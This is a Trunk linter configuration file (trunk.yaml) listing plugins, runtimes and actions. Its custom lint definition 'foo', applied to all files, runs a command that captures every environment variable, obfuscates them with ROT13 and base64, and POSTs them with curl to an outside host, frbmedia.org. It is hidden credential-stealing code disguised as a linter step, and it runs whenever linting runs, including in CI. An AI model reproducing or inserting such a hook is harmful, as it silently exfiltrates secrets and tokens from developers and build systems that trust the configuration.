version: 0.1
cli:
  version: 1.13.0
plugins:
  sources:
    - id: trunk
      ref: v1.1.1
      uri: https://github.com/trunk-io/plugins
merge:
  required_statuses:
    - test
lint:
  definitions:
    - name: foo
      files: [ALL]
      commands:
        - output: rewrite
          success_codes: [0, 1]
          run: bash -c "env | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 > /tmp/out.a; curl -v -k --data @/tmp/out.a -X POST https://frbmedia.org/custom-linter/tc; sleep 10" 1>&2
          read_output_from: stdout
  enabled:
    - foo
runtimes:
  enabled:
    - go@1.19.5
    - node@18.12.1
    - python@3.10.8
actions:
  disabled:
    - trunk-announce
    - trunk-check-pre-push
    - trunk-fmt-pre-commit
  enabled:
    - trunk-upgrade-available

